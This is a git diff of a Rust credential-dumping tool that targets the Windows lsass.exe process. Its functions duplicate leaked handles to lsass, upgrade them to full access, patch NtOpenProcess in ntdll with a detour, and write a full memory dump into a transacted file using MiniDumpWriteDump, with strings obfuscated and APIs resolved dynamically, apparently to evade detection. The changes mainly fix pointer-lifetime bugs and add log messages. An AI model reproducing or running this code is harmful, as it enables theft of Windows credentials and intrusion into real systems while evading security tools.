@@ -100,8 +100,10 @@ pub fn dump(key: &str, url: &str, leak: bool) {
 
             if (*shtei).process_id > 4 && (*shtei).process_id != lsass_pid && ((*shtei).process_id == target_pid || target_pid == 0)
             {
-                let handle_ptr: *mut HANDLE = std::mem::transmute(&HANDLE::default());
-                let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&OBJECT_ATTRIBUTES::default());
+                let h = HANDLE::default();
+                let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
+                let o = OBJECT_ATTRIBUTES::default();
+                let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
                 let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(*shtei).process_id as isize}, UniqueThread: HANDLE::default()};
                 let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
                
@@ -128,7 +130,8 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                 if handle.0 != 0 && handle.0 != -1
                 {
                     let target = HANDLE {0: (*shtei).handle_value as isize};
-                    let mut dup_handle: *mut HANDLE = std::mem::transmute(&HANDLE::default());
+                    let h = HANDLE::default();
+                    let mut dup_handle: *mut HANDLE = std::mem::transmute(&h);
                     let mut desired_access: u32 = 0x0400|0x0010; // PROCESS_QUERY_INFORMATION & PROCESS_VM_READ 
                     let mut options: u32 = 0;
 
@@ -160,7 +163,8 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                                        
                     let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default();
                     let poti_ptr: PVOID = std::mem::transmute(&poti);
-                    let ret_lenght: *mut u32 = std::mem::transmute(&u32::default());
+                    let l = u32::default();
+                    let ret_lenght: *mut u32 = std::mem::transmute(&l);
 
                     // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
                     let _ = dinvoke::nt_query_object(
@@ -209,7 +213,8 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                     {
                         if leak
                         {
-                            let full_access_handle: *mut HANDLE = std::mem::transmute(&HANDLE::default());
+                            let f = HANDLE::default();
+                            let full_access_handle: *mut HANDLE = std::mem::transmute(&f);
                             // We need to upgrade our lsass handle to full accesss in order to be able to dump the memory content
                             let x = dinvoke::nt_duplicate_object(
                                 *dup_handle,
@@ -245,9 +250,8 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             ret_len
                         );
 
-
                         if z == 0 
-                        {
+                        {                         
                             shtei = shtei.add(1);
                             let _r = dinvoke::close_handle(*dup_handle).unwrap();
                             let _r = dinvoke::close_handle(handle).unwrap();
@@ -264,12 +268,18 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             }
                             buff = buff.add(1);
                         }
-
+                        
+                        let temp = (*dup_handle).0;
                         // We have a valid process handled
                         if image_name.contains(&lc!("lsass.exe"))
                         {             
                             println!("{}.", &lc!("[+] Valid handle to lssas found"));
-  
+
+                            // This is required due to Rust optimizations in order to keep the handle active.
+                            let new_handle = HANDLE { 0: temp};
+                            let dup_handle: *mut HANDLE = std::mem::transmute(&new_handle); 
+                            (*dup_handle).0 = temp;
+
                             let description = "\0\0".as_ptr() as *mut u16;
                             let z = dinvoke::create_transaction(
                                 ptr::null_mut(),
@@ -289,14 +299,13 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                                 let _r = dinvoke::close_handle(handle).unwrap();
 
                                 println!("{}", &lc!("[x] Transaction creation failed."));
-
                                 continue;
                             }
                             else
                             {
                                 transaction_handle = z;
                             }
-                            
+
                             let m = 0xffffu32;
                             let mini: *const u32 = std::mem::transmute(&m);
                             let rand_string: String = thread_rng()
@@ -335,8 +344,8 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             {
                                 transacted_file_handle = z;
                             }
-                        
-                            STATIC_HANDLE = (*dup_handle).0;
+
+                            STATIC_HANDLE = (*dup_handle).0.clone();
 
                             if !hook()
                             {
@@ -347,7 +356,7 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             // We use the duplicated handle to dump the process memory
                             let x = dinvoke::mini_dump_write_dump(
                                 *dup_handle,
-                                0, // Process Id is not needed
+                                0, // Process Id is not required
                                 transacted_file_handle,
                                 0x00000002, // MiniDumpWithFullMemory
                                 ptr::null_mut(),
@@ -472,6 +481,7 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             }
                             else 
                             {
+                                println!("{}", &lc!("[x] Call to MiniDumpWriteDump failed."));
                                 let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                 let _r = dinvoke::close_handle(transaction_handle).unwrap();
                             }                           
@@ -603,7 +613,8 @@ pub fn force_leakage()
                 file.push(0);
                 let startup = vec![0u8;size_of::<STARTUPINFOW>()];
                 let startupinfo: *const STARTUPINFOW = std::mem::transmute(startup.as_ptr());
-                let process_information: *mut PROCESS_INFORMATION = std::mem::transmute(&PROCESS_INFORMATION::default());
+                let p = PROCESS_INFORMATION::default();
+                let process_information: *mut PROCESS_INFORMATION = std::mem::transmute(&p);
 
                 // 0x00000002 = LOGON_NETCREDENTIALS_ONLY 
                 dinvoke::dynamic_invoke!(adv,&lc!("CreateProcessWithLogonW"),create_process_with_logon,_create_process_with_logon_r,username.as_ptr() as *const u16,
@@ -612,7 +623,8 @@ pub fn force_leakage()
                 
         });
 
-        let dw_bytes: *mut u32 = std::mem::transmute(&u32::default());
+        let d = u32::default();
+        let dw_bytes: *mut u32 = std::mem::transmute(&d);
         let get_overlapped_result: data::GetOverlappedResult;
         let get_overlapped_result_r: Option<BOOL>;
         dinvoke::dynamic_invoke!(k32,&lc!("GetOverlappedResult"),get_overlapped_result,get_overlapped_result_r,file_handle,over,dw_bytes,true);
@@ -683,6 +695,7 @@ pub fn get_pid_from_image_path(path: &str) -> usize
         } 
 
         let _r = dinvoke::close_handle(file_handle);
+
         0
     }
 }
@@ -691,8 +704,8 @@ pub fn hook () -> bool
 {
     unsafe 
     {
-
-        let detour_addresss: usize = std::mem::transmute(nt_open_process_detour as fn (*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32);
+        let detour = nt_open_process_detour as fn (*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32;
+        let detour_addresss: usize = std::mem::transmute(detour);
 
         let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
         let handle = GetCurrentProcess();
@@ -700,7 +713,8 @@ pub fn hook () -> bool
         let base_address: *mut PVOID = std::mem::transmute(&ntop_base_address);
         let size = 13 as usize; // for x64 processor
         let size: *mut usize = std::mem::transmute(&size);
-        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
+        let o = u32::default();
+        let old_protection: *mut u32 = std::mem::transmute(&o);
 
         let z = dinvoke::nt_protect_virtual_memory( 
             handle,
@@ -736,7 +750,8 @@ pub fn hook () -> bool
             *(ntop_ptr.add(5)) = 0xC3
         } 
         
-        let unused: *mut u32 = std::mem::transmute(&u32::default());
+        let u = u32::default();
+        let unused: *mut u32 = std::mem::transmute(&u);
 
         let z = dinvoke::nt_protect_virtual_memory(
             handle,
@@ -762,7 +777,7 @@ pub fn hook () -> bool
 pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _object_attributes: *mut OBJECT_ATTRIBUTES, _client_id: *mut CLIENT_ID)  -> i32
 {
     unsafe 
-    {
+    {   
         let dup_handle = HANDLE{0: STATIC_HANDLE};
         let _  = dinvoke::set_handle_information(
             dup_handle,
@@ -770,7 +785,7 @@ pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _
             0x00000002
         );
 
-        _process_handle = std::mem::transmute(&dup_handle);//dup_handle;
+        _process_handle = std::mem::transmute(&dup_handle);
 
         0
     }
